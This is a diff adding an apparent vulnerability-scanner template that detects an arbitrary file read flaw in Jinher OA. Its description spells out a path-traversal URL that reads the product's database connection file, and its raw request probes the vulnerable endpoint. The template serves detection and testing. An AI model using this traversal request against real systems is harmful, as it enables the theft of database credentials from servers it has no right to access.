@@ -1,0 +1,23 @@
+id: jinher-oa-fileuploadmessage-fileread
+info:
+  name: jinher-oa-fileuploadmessage-fileread
+  author: apple
+  severity: high
+  description: 有概率可以读取到/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml数据库文件
+  reference:
+    - https://github.com/izj007/wechat/blob/6e7df868365478390864d21ba38e70ec74a8dd51/articles/%5B%E5%8D%97%E9%A3%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%96%87%E5%BA%93%5D-2023-11-3-%E2%80%8B%E9%87%91%E5%92%8COA%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20%E9%99%84POC.md?plain=1#L47
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '文件不存在'
